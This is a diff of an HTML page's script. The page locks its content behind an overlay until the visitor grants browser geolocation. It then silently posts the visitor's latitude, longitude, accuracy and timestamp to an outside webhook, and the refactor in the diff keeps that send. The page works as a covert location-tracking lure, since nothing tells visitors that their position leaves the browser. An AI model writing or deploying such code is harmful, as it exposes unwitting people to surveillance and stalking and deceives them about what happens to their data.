@@ -30,7 +30,7 @@
     }
 
 	</style>
-	// Created by Richard //
+	<-- Created by Richard -->
 </head>
 <body>
 <div id="overlay">
@@ -123,57 +123,55 @@ function updateClockManualAmPm() {
 }
 	setInterval(updateClockManualAmPm, 1000);
 	updateClockManualAmPm();
+	
+  document.addEventListener("DOMContentLoaded", () => {
+  console.log("Page loaded, waiting for user consent");
 
-document.addEventListener("DOMContentLoaded", () => {
-  runOnEnter();
+  const overlay = document.getElementById("overlay");
+  const content = document.getElementById("content");
+  const allowBtn = document.getElementById("allow");
+
+  if (!navigator.geolocation) {
+    alert("Geolocation not supported by this browser");
+    return;
+  }
+
+  allowBtn.addEventListener("click", requestLocation);
 });
 
-function runOnEnter() {
-  console.log("Visitor entered the site");
-
-  if (!navigator.geolocation) {
-    console.error("Geolocation not supported");
-    return;
-  }
-
-document.getElementById("allow").addEventListener("click", () => {
-  if (!navigator.geolocation) {
-    alert("Geolocation not supported");
-    return;
-  }
-
+function requestLocation() {
   navigator.geolocation.getCurrentPosition(
-    (position) => {
-      // Permission granted
-      document.getElementById("overlay").style.display = "none";
-      document.getElementById("content").style.display = "block";
-
-      // Optional: send to webhook
-      fetch("https://app.hooklistener.com/w/my-first-endpoint-opbl", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          latitude: position.coords.latitude,
-          longitude: position.coords.longitude,
-          accuracy: position.coords.accuracy,
-          timestamp: new Date().toISOString()
-        })
-      });
-    },
-    (error) => {
-      alert("Location permission is required to use this site.");
-    }
+    onLocationGranted,
+    onLocationDenied
   );
-});
+}
 
+function onLocationGranted(position) {
+  // Unlock site
+  document.getElementById("overlay").style.display = "none";
+  document.getElementById("content").style.display = "block";
+
+  // Send data
+  sendToWebhook({
+    latitude: position.coords.latitude,
+    longitude: position.coords.longitude,
+    accuracy: position.coords.accuracy,
+    timestamp: new Date().toISOString()
+  });
+}
+
+function onLocationDenied(error) {
+  alert("Location permission is required to use this site.");
+}
 
 function sendToWebhook(payload) {
   fetch("https://app.hooklistener.com/w/my-first-endpoint-opbl", {
     method: "POST",
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify(payload)
-  });
+  }).catch(err => console.error("Webhook failed", err));
 }
+
 </script>
 </body>
 </html>
